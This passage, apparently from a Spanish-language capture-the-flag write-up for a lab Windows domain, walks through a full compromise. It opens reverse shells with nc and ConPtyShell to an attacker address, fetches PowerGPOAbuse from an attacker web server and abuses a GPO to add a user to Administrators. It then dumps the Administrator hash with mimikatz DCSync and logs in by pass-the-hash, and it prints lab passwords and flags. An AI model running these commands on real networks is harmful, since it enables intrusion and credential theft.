----                -------------         ------ ----
-a----       05/01/2026     14:01          33792 ConPtyShell.exe
-a----       05/01/2026     13:48          59392 nc.exe
-a----       05/01/2026     13:57             92 s.bat
```

Veremos que esta funcionando, por lo que vamos a llamar al servicio para que ejecute el `nc` y obtener una shell como el usuario que lo este ejecutando, pero antes nos pondremos con una segunda escucha desde `kali`.

```shell
nc -lvnp <PORT>
```

Ahora si vamos a ejecutar el binario mediante el servicio.

```powershell
.\nc.exe 127.0.0.1 7734 -v
```

Info:

```
WEB.TEIGNTON.HTB [127.0.0.1] 7734 (?) open
password=2026-01-05-thisisleet
OK
command=C:\Temp\shell.exe
CONTEXT{l0l_s0c3ts_4re_fun}
```

Ahora si volvemos a donde tenemos la segunda escucha, veremos lo siguiente:

```
listening on [any] 6666 ...
connect to [10.10.14.105] from (UNKNOWN) [10.13.37.12] 41256
whoami
teignton\andy.teignton
```

Vemos que ha funcionado y seremos el usuario `andy.teignton`, para tener una mejor `shell` utilizaremos el mismo binario de antes `a` de esta forma:

```shell
socat file:`tty`,raw,echo=0 TCP-L:<PORT>
```

Ahora ejecutamos el binario...

```powershell
C:\Temp\ConPtyShell.exe <IP_ATTACKER> <PORT>
```

Y si volvemos a la escucha veremos que ha funcionado bien, con una `shell` limpia:

```
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> whoami
teignton\andy.teignton
```

Despues de estar un rato buscando permisos, `ACLs`, `GPOs`, veremos algo bastante interesante y es que si probamos a crear un `GPO` de prueba, nos va a funcionar:

Si verificamos los `GOPs` que hay veremos que tenemos un llamado `localadmin` el cual fue el que me dio la idea de crear un `GPO`.

```powershell
Get-GPO -All | Select-Object DisplayName, Owner | Sort-Object DisplayName
```

Info:

```
DisplayName                       Owner
-----------                       -----
Default Domain Controllers Policy TEIGNTON\Domain Admins
Default Domain Policy             TEIGNTON\Domain Admins
localadmin                        TEIGNTON\andy.teignton
```

Si lo creamos...

```powershell
New-GPO -Name "Demo_$(Get-Date -Format 'HHmm')"
```

Info:

```
DisplayName      : Demo_1444
DomainName       : TEIGNTON.HTB
Owner            : TEIGNTON\andy.teignton
Id               : 75e833a0-0e1d-43f9-972a-43f2d08a146e
GpoStatus        : AllSettingsEnabled
Description      :
CreationTime     : 05/01/2026 14:44:30
ModificationTime : 05/01/2026 14:44:30
UserVersion      : AD Version: 0, SysVol Version: 0
ComputerVersion  : AD Version: 0, SysVol Version: 0
WmiFilter        :
```

Ahora si verificamos que se haya creado:

```powershell
Get-GPO -All | Select-Object DisplayName, Owner | Sort-Object DisplayName
```

Info:

```
DisplayName                       Owner
-----------                       -----
Default Domain Controllers Policy TEIGNTON\Domain Admins
Default Domain Policy             TEIGNTON\Domain Admins
Demo_1444                         TEIGNTON\andy.teignton
localadmin                        TEIGNTON\andy.teignton
```

Vemos que se ha creado de forma correcta, sabiendo esto, desde el `GPO` que hemos creado vamos a configurarlo de tal forma que se vincule a un grupo `Domain Controllers` para que posteriormente utilicemos una herramienta que aproveche la vulnerabilidad que vamos a crear y escalar privilegios.

```powershell
New-GPLink -Name "Demo_1444" -Target "OU=Domain Controllers,DC=TEIGNTON,DC=HTB" -LinkEnabled Yes
```

Info:

```
GpoId       : 75e833a0-0e1d-43f9-972a-43f2d08a146e
DisplayName : Demo_1444
Enabled     : True
Enforced    : False
Target      : OU=Domain Controllers,DC=TEIGNTON,DC=HTB
Order       : 2
```

Con esto vemos que se hizo bien, ahora vamos aprovechar esta vulnerabilidad que hemos creado para escalar privilegios.

URL = [SharpGPOAbuse.ps1 GitHub Download](https://github.com/rootSySdk/PowerGPOAbuse)

Una vez que nos descarguemos el `.ps1` lo subiremos abriendo un servidor local de `python3` en nuestro `kali`.

```shell
python3 -m http.server 80
```

Ahora desde `PowerShell` ejecutaremos esto:

```powershell
iwr http://<IP_ATTACKER>/PowerGPOAbuse.ps1 -o PowerGPOAbuse.ps1
```

Una vez que nos lo hayamos pasado, vamos a ejecutar la herramienta aprovechando la vulnerabilidad para añadir al grupo local de administradores al usuario `jay.teignton` ya que con este usuario podemos iniciar sesion directamente en `evil-winrm`.

```powershell
Import-Module .\PowerGPOAbuse.ps1
Add-GPOGroupMember -Member "jay.teignton" -GPOIdentity "Demo_1444" -BuiltinGroup "Administrators" -Force
```

Info:

```
True
```

Con esto veremos que ha funcionado, vamos actualizar las politicas de grupo para que se apliquen los cambios.

```powershell
gpupdate /force
```

Info:

```
Updating policy...

Computer Policy update has completed successfully.
User Policy update has completed successfully.
```

Vamos a iniciar sesion con el usuario al que añadimos a dicho grupo.

```shell
evil-winrm -i <IP> -u jay.teignton -p 'D0ntL0seSk3l3tonK3y!'
```

Ahora si visualizamos los grupos a los que pertenecemos veremos lo siguiente:

```powershell
Get-ADPrincipalGroupMembership -Identity "jay.teignton" | Select Name
```

Info:

```
Name
----
Domain Users
Administrators
Remote Desktop Users
Remote Management Users
```

Veremos que ha funcionado, por lo que ya podremos entrar en la carpeta del usuario `Administrator` y poder leer la `flag` de esta forma:

```powershell
cd C:\Users\Administrator\Documents
type flag.txt
```

Info:

```
CONTEXT{OU_4bl3_t0_k33p_4_s3cret?}
```

> Key to the castle (Flag)

```
CONTEXT{OU_4bl3_t0_k33p_4_s3cret?}
```

### EXTRA

Si queremos ser el usuario `Administrator` directamente, podremos copiarnos el `mimikatz.exe` a nuestra ruta actual de `kali` para pasarlo a la maquina victima.

```shell
cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe .
```

Ahora desde la maquina victima en `PowerShell` con el `evil-winrm` ejeuctaremos lo siguiente:

```powershell
cd C:\Temp\
upload mimikatz.exe
```

Hecho esto vamos a ejecutarlo de esta forma:

```powershell
.\mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:teignton.htb /user:Administrator" "exit"
```

Info:

```

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # lsadump::dcsync /domain:teignton.htb /user:Administrator
[DC] 'teignton.htb' will be the domain
[DC] 'WEB.TEIGNTON.HTB' will be the DC server
[DC] 'Administrator' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : Administrator

** SAM ACCOUNT **

SAM Username         : Administrator
User Principal Name  : Administrator@TEIGNTON.HTB
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   :
Password last change : 12/10/2020 13:34:20
Object Security ID   : S-1-5-21-3174020193-2022906219-3623556448-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: 5059c4cf183da02e2f41bb1f53d713cc

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : f0a3bbc4c8a22573685ec11d8b5a76c9

* Primary:Kerberos-Newer-Keys *
    Default Salt : WIN-K0IK59G7ILOAdministrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 90f5c97ddad9eaf5aa247836e00b7a4c89935258c2a01ce051594cf3cb03798d
      aes128_hmac       (4096) : 466d899b2f855f4f705cb990a427168a
      des_cbc_md5       (4096) : c451bf16c416dce0

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : WIN-K0IK59G7ILOAdministrator
    Credentials
      des_cbc_md5       : c451bf16c416dce0


mimikatz(commandline) # exit
Bye!
```

De toda esta informacion la que nos importa es esta linea:

```
Credentials:
  Hash NTLM: 5059c4cf183da02e2f41bb1f53d713cc
```

Ahora vamos a realizar un `Pass-The-Hash` de esta forma:

```shell
evil-winrm -i <IP> -u Administrator -H "5059c4cf183da02e2f41bb1f53d713cc"
```

Info:

```
Evil-WinRM shell v3.9

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
teignton\administrator
```

Veremos que ha funcionado, por lo que ya seremos `Administrador` del sistema entero.
